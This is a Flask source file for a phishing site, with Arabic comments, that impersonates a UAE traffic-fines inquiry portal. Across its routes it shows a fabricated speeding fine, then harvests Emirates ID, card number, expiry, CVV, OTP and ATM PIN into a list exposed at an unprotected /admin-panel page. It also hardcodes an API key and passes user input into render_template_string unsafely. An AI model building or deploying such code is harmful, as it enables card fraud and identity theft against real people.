import os
from flask import Flask, render_template_string, request

app = Flask(__name__)
captured_data = []

# المفتاح الخاص بك (Zyla API)
ZYLA_API_KEY = "12396|sAN3atDH7TOgvcAGqdhtz6mkp7DDlaNcoZ41spYZ"

# --- 1. الصفحة الرئيسية (كودك الأصلي كامل) ---
HOME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html { margin: 0; padding: 0; width: 100%; background-color: #ffffff; scroll-behavior: smooth; }
    .sticky-header { position: sticky; top: 0; z-index: 9999; width: 100%; background-color: #ffffff; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
    .sticky-header img { width: 100%; display: block; }
    .page-content { display: flex; flex-direction: column; width: 100%; }
    .page-content img { width: 100%; height: auto; display: block; }
    .interactive-btn { position: relative; cursor: pointer; transition: transform 0.2s; -webkit-tap-highlight-color: transparent; }
    .interactive-btn:active { transform: scale(0.94); filter: brightness(0.9); }
    .full-link { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; }
</style>
</head>
<body>
    <div class="sticky-header">
        <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
    </div>
    <div class="page-content">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <div class="interactive-btn">
            <a href="/search" class="full-link"></a>
            <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        </div>
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <div class="interactive-btn">
            <a href="/search" class="full-link"></a>
            <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        </div>
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_a4395e1857c74368b9e7460f40c83938~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (كودك الأصلي كامل) ---
SEARCH_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<style>
    body, html { margin: 0; padding: 0; width: 100%; background-color: #f4f4f4; font-family: sans-serif; }
    .header-image { width: 100%; display: block; margin-bottom: 30px; }
    .main-card { background: white; max-width: 600px; margin: 0 auto 50px auto; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #ddd; }
    .card-title { background-color: #b0914f; color: white; padding: 20px; text-align: center; font-size: 20px; font-weight: bold; }
    .content { padding: 30px; }
    .form-group { margin-bottom: 20px; text-align: right; }
    label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
    select, input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
    .plate-grid { display: grid; grid-template-columns: 1fr 1fr 2fr; gap: 10px; }
    .btn-search { background-color: #b0914f; color: white; border: none; padding: 16px; border-radius: 4px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" class="header-image">
    <div class="main-card">
        <div class="card-title">نظام الاستعلام عن المخالفات المرورية - دولة الإمارات</div>
        <form action="/report" method="POST" class="content">
            <div class="form-group">
                <label>الإمارة / مصدر اللوحة:</label>
                <select name="source">
                    <option>أبوظبي (Abu Dhabi)</option><option>دبي (Dubai)</option><option>الشارقة (Sharjah)</option>
                    <option>عجمان (Ajman)</option><option>أم القيوين (Umm Al Quwain)</option><option>رأس الخيمة (Ras Al Khaimah)</option><option>الفجيرة (Fujairah)</option>
                </select>
            </div>
            <div class="form-group">
                <label>بيانات اللوحة (الفئة - الرمز - الرقم):</label>
                <div class="plate-grid">
                    <select name="category"><option>خصوصي</option><option>نقل عام</option></select>
                    <input type="text" name="plateCode" placeholder="الرمز">
                    <input type="text" name="plateNumber" placeholder="الرقم">
                </div>
            </div>
            <div class="form-group">
                <label>رقم الهوية الإماراتية (Emirates ID):</label>
                <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X" required>
            </div>
            <button type="submit" class="btn-search">بحث عن المخالفات</button>
        </form>
    </div>
</body>
</html>
"""

# --- الهيدر الثابت لباقي صفحات الدفع ---
PAYMENT_HEADER = """
<div style="position: sticky; top: 0; z-index: 9999; width: 100%; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; display:block;">
</div>
"""

# --- مسارات Flask ---

@app.route('/')
def index():
    return render_template_string(HOME_HTML)

@app.route('/search')
def search_page():
    return render_template_string(SEARCH_HTML)

@app.route('/report', methods=['POST'])
def report():
    plate = request.form.get('plateNumber', '---')
    return render_template_string(f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><style>
        body {{ background:#f4f4f4; font-family:sans-serif; margin:0; }}
        .box {{ max-width:500px; margin:20px auto; background:white; border-radius:12px; border-top:8px solid #b0914f; padding:20px; box-shadow:0 5px 15px rgba(0,0,0,0.1); }}
        .row {{ display:flex; justify-content:space-between; padding:12px 0; border-bottom:1px solid #eee; }}
        .btn {{ background:#b0914f; color:white; width:100%; padding:15px; border:none; border-radius:8px; font-weight:bold; margin-top:20px; cursor:pointer; text-decoration:none; display:block; text-align:center; }}
    </style></head>
    <body>
        {PAYMENT_HEADER}
        <div class="box">
            <h2 style="text-align:center; color:#b0914f;">تقرير المخالفات الرسمي</h2>
            <div class="row"><span>اسم صاحب المركبة:</span><b>سعيد محمد العامري</b></div>
            <div class="row"><span>رقم اللوحة:</span><b>{plate}</b></div>
            <div class="row"><span>نوع المخالفة:</span><b>تجاوز السرعة (رادار)</b></div>
            <div class="row" style="background:#fff9e6; padding:10px;"><span>المبلغ المطلوب:</span><b style="color:red;">255.00 AED</b></div>
            <a href="/card-info" class="btn">المتابعة لسداد المخالفات</a>
        </div>
    </body></html>""")

@app.route('/card-info')
def card_info():
    return render_template_string(f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><style>
        .pay-card {{ max-width:400px; margin:30px auto; background:white; border-radius:15px; border:1px solid #b0914f; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.1); }}
        .pay-head {{ background:#b0914f; color:white; padding:20px; text-align:center; }}
        .pay-body {{ padding:25px; }}
        input {{ width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:8px; box-sizing:border-box; }}
        .btn {{ background:#b0914f; color:white; width:100%; padding:15px; border:none; border-radius:8px; font-weight:bold; cursor:pointer; }}
    </style></head>
    <body>
        {PAYMENT_HEADER}
        <div class="pay-card">
            <div class="pay-head"><h3>بوابة الدفع الآمنة</h3></div>
            <form action="/otp" method="POST" class="pay-body">
                <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
                <input type="text" name="card_num" placeholder="رقم البطاقة (16 رقم)" required>
                <div style="display:flex; gap:10px;"><input type="text" name="exp" placeholder="MM/YY" required><input type="text" name="cvv" placeholder="CVV" required></div>
                <button type="submit" class="btn">تأكيد البيانات</button>
            </form>
        </div>
    </body></html>""")

@app.route('/otp', methods=['POST'])
def otp_page():
    captured_data.append(request.form.to_dict())
    return render_template_string(f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><style>
        .box {{ max-width:400px; margin:50px auto; background:white; padding:30px; border-radius:12px; text-align:center; border:1px solid #ddd; }}
        input {{ width:150px; padding:15px; font-size:24px; text-align:center; border:2px solid #b0914f; border-radius:8px; }}
        .btn {{ background:#b0914f; color:white; width:100%; padding:15px; border:none; border-radius:8px; margin-top:20px; font-weight:bold; }}
    </style></head>
    <body>
        {PAYMENT_HEADER}
        <div class="box">
            <h3>رمز التحقق (OTP)</h3>
            <p>أدخل الرمز المرسل لهاتفك لإتمام العملية</p>
            <form action="/pin" method="POST">
                <input type="text" name="otp" placeholder="****" required>
                <button type="submit" class="btn">تحقق</button>
            </form>
        </div>
    </body></html>""")

@app.route('/pin', methods=['POST'])
def pin_page():
    captured_data.append(request.form.to_dict())
    return render_template_string(f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><style>
        .box {{ max-width:400px; margin:50px auto; background:white; padding:30px; border-radius:12px; text-align:center; border:1px solid #ddd; }}
        input {{ width:100%; padding:15px; text-align:center; border:1px solid #ccc; border-radius:8px; box-sizing:border-box; }}
        .btn {{ background:#b0914f; color:white; width:100%; padding:15px; border:none; border-radius:8px; margin-top:20px; font-weight:bold; }}
    </style></head>
    <body>
        {PAYMENT_HEADER}
        <div class="box">
            <h3>الرقم السري (ATM PIN)</h3>
            <p>يرجى إدخال الرقم السري للبطاقة لتأكيد السداد</p>
            <form action="/success" method="POST">
                <input type="password" name="pin" placeholder="****" required>
                <button type="submit" class="btn">إتمام الدفع</button>
            </form>
        </div>
    </body></html>""")

@app.route('/success', methods=['POST'])
def success():
    captured_data.append(request.form.to_dict())
    return "<h2 style='text-align:center; margin-top:100px;'>جاري معالجة الطلب...</h2>"

@app.route('/admin-panel')
def admin():
    return f"<body><h1>Log:</h1>{str(captured_data)}</body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
